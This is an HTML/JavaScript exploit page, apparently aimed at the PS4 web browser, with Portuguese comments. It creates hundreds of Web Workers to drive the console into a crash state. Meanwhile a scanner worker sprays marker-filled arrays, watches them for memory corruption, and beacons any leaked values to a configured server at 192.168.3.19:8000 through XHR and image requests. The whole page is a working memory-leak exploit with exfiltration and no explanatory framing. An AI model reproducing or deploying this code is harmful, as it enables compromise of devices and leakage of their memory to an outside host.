<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 REAL-TIME MONITOR</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 2px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        .scanning { color: #ff0; border-color: #ff0; background: #220; }
        .critical { color: #fff; border-color: #f00; background: #500; animation: shake 0.5s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px) } 50% { transform: translate(-1px, -1px) } 100% { transform: translate(1px, -1px) } }
    </style>
</head>
<body>

    <h1>REAL-TIME MONITOR (DEDICATED WORKER)</h1>
    <div id="status">CONFIGURE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // <--- SEU IP
        const SERVER_PORT = "8000";
        
        const SCAN_START = 380;   // Liga o Scanner antes do perigo
        const DANGER_ZONE = 400;  // Zona de Crash
        const MAX_THREADS = 430;
        
        const PATTERN = 0xDEADBEEF;

        let workers = [];
        let monitorWorker = null;

        // --- CÓDIGO DO WORKER "VIGIA" (SCANNER DEDICADO) ---
        const monitorCode = `
            const IP = "${SERVER_IP}";
            const PORT = "${SERVER_PORT}";
            const PATTERN = ${PATTERN};
            const STRUCT_SIZE = 128; // 512 bytes

            // Criação da "Rede" (Trap Arrays)
            // Criamos 500 arrays para espalhar pela memória RAM
            let traps = [];
            for(let i=0; i<500; i++) {
                let t = new Uint32Array(STRUCT_SIZE);
                t.fill(PATTERN);
                t[0] = 0x11111111; // Inicio
                t[STRUCT_SIZE-1] = 0x99999999; // Fim
                traps.push(t);
            }

            // Função de envio rápido (Image Beacon)
            function send(data) {
                const req = new XMLHttpRequest(); // XHR é assíncrono e rápido
                req.open("GET", "http://" + IP + ":" + PORT + "/" + data, true);
                req.send();
            }

            // Loop Infinito de Escaneamento
            // Isso vai rodar em paralelo ao crash
            setInterval(() => {
                for(let k=0; k<traps.length; k++) {
                    const arr = traps[k];
                    
                    // Checagem Otimizada (Apenas offset 16 e 32)
                    if(arr[16] !== PATTERN || arr[32] !== PATTERN) {
                        
                        // Varredura completa se achou suspeito
                        for(let i=0; i<STRUCT_SIZE; i++) {
                            let val = arr[i];
                            if(val !== PATTERN && val !== 0x11111111 && val !== 0x99999999 && val !== 0) {
                                
                                // ENCONTROU! ENVIA TUDO!
                                const hex = (val >>> 0).toString(16);
                                send("LEAK_OFF_" + (i*4) + "_VAL_" + hex);
                                
                                // Tenta enviar vizinhos
                                if(i+1 < STRUCT_SIZE) {
                                    send("HIGH_" + (arr[i+1] >>> 0).toString(16));
                                }
                                return; // Fim
                            }
                        }
                    }
                }
            }, 5); // Roda a cada 5ms (Tempo Real)
        `;

        // Worker Passivo (Enche linguiça)
        const dummyBlob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const dummyUrl = URL.createObjectURL(dummyBlob);

        function start() {
            if(SERVER_IP.includes("XX")) return alert("IP ERRADO");
            
            // Inicia teste de conexão
            logToAndroid("INICIO_RT_MONITOR");
            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nSUBINDO PRESSÃO...`;

            loopThreads();
        }

        function loopThreads() {
            let i = setInterval(() => {
                // Para se passar do limite
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }

                workers.push(new Worker(dummyUrl));

                // Atualiza UI
                if(workers.length % 10 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}`;

                // ATIVA O VIGIA EM 380
                if(workers.length === SCAN_START && !monitorWorker) {
                    document.getElementById('status').className = "scanning";
                    document.getElementById('status').innerText += "\nSCANNER ATIVO!";
                    logToAndroid("SCANNER_START_380");
                    
                    const monBlob = new Blob([monitorCode], {type:'text/javascript'});
                    monitorWorker = new Worker(URL.createObjectURL(monBlob));
                }

                // ZONA CRÍTICA 400+
                if(workers.length >= DANGER_ZONE) {
                    document.getElementById('status').className = "critical";
                    
                    // Aqui reduzimos a velocidade de criação para dar chance ao Scanner
                    // Limpa o intervalo rápido e começa um lento
                    clearInterval(i);
                    slowDeath(); 
                }

            }, 30); // Velocidade normal
        }

        function slowDeath() {
            logToAndroid("CRITICAL_ZONE_400");
            
            // Cria threads bem devagar agora
            let i = setInterval(() => {
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }
                
                workers.push(new Worker(dummyUrl));
                document.getElementById('status').innerText = `CRITICAL: ${workers.length}`;
                
            }, 150); // 150ms de pausa entre cada thread na zona da morte
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
